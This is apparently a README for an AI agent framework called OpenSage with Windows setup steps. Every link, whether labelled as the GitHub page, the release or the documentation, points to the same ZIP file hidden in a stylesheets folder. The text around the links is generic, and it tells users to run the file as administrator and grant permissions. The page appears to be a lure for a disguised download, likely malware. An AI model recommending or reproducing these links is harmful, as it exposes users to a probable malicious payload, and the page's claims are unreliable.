# ⚙️ opensage-adk - Run AI agents on Windows with ease

[![Visit Download Page](https://img.shields.io/badge/Download%20Page-OpenSage%20Repo-blue?style=for-the-badge)](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)

## 🖥️ What OpenSage Does

OpenSage is an agent framework for people who want to run AI tools, memory, and task flows on their own computer. It gives you a way to start the app on Windows and use a command-line interface with a web view for easier debugging.

OpenSage includes:

- AI-made agent structure
- AI-made tools
- Safe tool execution in a sandbox
- Short-term and long-term memory
- Support for software engineering tasks
- A CLI called `opensage`
- A web UI for interactive debugging

## 📥 Download OpenSage

Visit the main GitHub page to get the software:

[https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)

On that page, look for the latest release, source files, or setup files for Windows. If you see a release asset for Windows, download that file. If the project uses source code only, download the repository files from GitHub.

## 🪟 Windows Requirements

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 2 GB of free disk space
- A stable internet connection
- Administrator access for setup
- Python 3.12 or newer
- `uv`, which helps install and run the app

If your computer is older, the app may still run, but it can feel slow when AI tools do more work.

## 🧰 What You Need Before Setup

Install these first:

1. Python 3.12 or newer
2. `uv`
3. Git, if you want to download the project from the command line

If you do not want to use the command line, download the project from GitHub as a ZIP file and extract it to a folder on your PC.

## 🚀 Getting Started on Windows

### 1. Download the project

Go to:

[https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)

Then do one of these:

- Download the ZIP file from the code page
- Clone the repository with Git
- Open the latest release if one is available

### 2. Open the project folder

After the download finishes:

- Find the folder on your computer
- Extract the ZIP file if needed
- Open the folder in File Explorer

If you used Git, open the folder where you cloned the project.

### 3. Open PowerShell in the folder

On Windows:

- Right-click inside the project folder
- Choose Open in Terminal or Open PowerShell window here
- A terminal window will open in the right folder

### 4. Install the app files

If the project includes a setup file or install command, run it from the terminal in the project folder.

A common setup flow for this project is:

- Install Python packages
- Prepare the local environment
- Start the `opensage` command

If the repository includes a `pyproject.toml` file, `uv` will usually handle the install step.

### 5. Start OpenSage

Run the app from PowerShell with the command below if the project uses the CLI:

`opensage`

If the project uses a launch script, run the script from the project folder instead.

### 6. Open the web UI

When the app starts, it may show a local web address such as:

`http://localhost:xxxx`

Open that address in your browser to use the web UI for debugging and task work.

## 🧪 First Run Checklist

When you start OpenSage for the first time:

- Wait for the setup to finish
- Keep the terminal window open
- Look for the local web address
- Copy that address into your browser
- Check that the app loads without errors

If the app asks for model settings or API keys, enter them in the config file or in the setup screen if one appears.

## 🧠 Main Features You Can Use

### Agent structure

OpenSage can create and manage agent structure and topology. This helps when you want one agent to handle a task and another agent to support it.

### Tool creation

OpenSage lets AI write tools. That means the system can build new task helpers when needed.

### Memory

OpenSage uses a memory structure with:

- Short-term memory for current work
- Long-term memory for saved context

This helps the app remember what matters across tasks.

### Sandboxed execution

OpenSage can run tools in a sandbox. A sandbox keeps work separate from the rest of your system. The current recommended backend is `native`.

### Software engineering tools

OpenSage includes tools made for coding and project work. These tools help with tasks like:

- Reading files
- Planning work
- Running checks
- Handling project context

## 🧩 Typical Windows Setup Flow

If you are using the source code version, the usual flow is:

1. Download the repository
2. Install Python 3.12 or newer
3. Install `uv`
4. Open the project folder
5. Install dependencies
6. Start the `opensage` command
7. Open the local web page in your browser

## 🔧 Common Folder Layout

After setup, you may see files and folders such as:

- `README.md` - project instructions
- `LICENSE` - license terms
- `pyproject.toml` - Python project settings
- `src` - source code
- `docs` - documentation files
- `.github` - GitHub workflow files

You do not need to edit these files to use the app.

## 🌐 Documentation

Full documentation is here:

[https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)

Use the docs if you want more detail on setup, config, or advanced use.

## 🛠️ If Something Does Not Work

If the app does not start:

- Check that Python 3.12 or newer is installed
- Check that `uv` is installed
- Make sure you opened the terminal in the project folder
- Make sure the terminal is still running
- Try closing and reopening PowerShell
- Try downloading the project again if files seem incomplete

If the browser does not open:

- Copy the local address from the terminal
- Paste it into your browser
- Make sure no other app is using the same port

If Windows blocks the app:

- Right-click the file or folder
- Choose Run as administrator if needed
- Allow access when Windows asks for permission

## 📄 License

This project uses the Apache License 2.0.

See the license file here:

[`LICENSE`](LICENSE)

## 📦 Project Name

Repository: `opensage-adk`

Product name: OpenSage